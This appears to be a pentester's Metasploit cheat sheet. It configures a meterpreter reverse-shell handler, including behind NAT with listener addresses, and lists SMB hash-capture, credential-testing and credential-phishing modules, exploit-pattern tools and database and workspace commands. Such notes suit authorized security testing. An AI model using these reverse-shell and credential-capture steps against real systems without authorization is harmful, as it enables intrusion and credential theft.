Metasploit
========================

## Reverse shell with meterpreter using shellter

    msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set autorunscript post/windows/manage/migrate
    

https://www.offensive-security.com/metasploit-unleashed/scanner-http-auxiliary-modules/

scanner/http/enum_wayback (Cached URLs)
scanner/http/dir_scanner (URLs attempts)
scanner/http/files_dir (files unreferenced in application)

Windows exploitation modules
For admin local accounts

	auxiliary/scanner/smb/smb_login		(testing for credentials in windows) This works!!!
	auxiliary/server/capture/smb		(Capturing smb hashes) This works!!!
	auxiliary/admin/smb/psexec_command	(psexec command utility msfconole [not working])

This module get windows admin credentials like phishing. It is very important to note that this module works with a session already opened:
	use/gather/phish_windows-credentials
	

Module to generate patterns for exploit development

	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb

Module to find the offset of the pattern

	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb	


## Reverse shell in nat'ed environments:

    set ReverseListenerBindAddress <HOST_IP>
    set ReverseListenerBindPort <HOST_PORT>
    set LHOST <IP_ADDR_who_makes_nat>
    set LPORT <PORT_who_makes_nat>

Example:
  
    set LHOST 172.21.85.241
    set LPORT 4445
    set ReverseListenerBindAddress 192.168.120.130
    set ReverseListenerBindPort 4444    

## ms17-010 in 32 bits

    dpkg --add-architecture i386
    

## commands


command line

msfconsole -q -x "search ms17-010;quit"

msdb init  (Initial configuration for metasploit database)
Database is set properly

If any problems with the connection, use the file generated with the command above:

└─$ sudo msfdb init
[sudo] password for acosta: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
[+] Creating databases 'msf_test'
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema


    db_connect -y /usr/share/metasploit-framework/config/database.yml

msfconsole -p /opt/scripts/ruby/pentest.rb (-p load a plugin)

or

load /path/to/-plugin

db_import /opt/customers/apdata/2_Scanning/apdata_scan_nessus_zcbt01.nessus


Managing vulnerabilities with pentest.rb

vulns

vuln_exploit (load a exploit for each vulnerability)

vuln_exploit -m (match vulnerabilities with exploits)


Working with workspaces

workspace -a apdata (add a new workspace)

workspace -d default (remove workspace)

workspace -r apdata apdata2 (rename workspace)

services (list open ports)

services -p 22 -R (set RHOSTS of an auxiliary for example)



Another options for searching exploits:

pentest.rb plugin

https://sploitus.com

searchsploit -u (for update)